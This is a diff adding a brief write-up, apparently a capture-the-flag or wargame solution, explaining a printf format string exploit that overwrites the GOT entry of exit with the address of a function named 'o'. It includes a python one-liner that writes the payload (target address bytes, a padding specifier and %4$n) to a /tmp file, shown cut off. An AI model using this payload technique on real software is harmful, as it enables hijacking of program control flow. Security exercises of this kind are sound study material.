@@ -1,0 +1,5 @@
+We use an exploitation of printf format specifier.
+We override the got entry for exit function with the "o" function one.
+
+Our exploit :
+- python -c 'print "\x38\x98\x04\x08" +"%134513824x" + "%4$n"' > /tmp/payloa
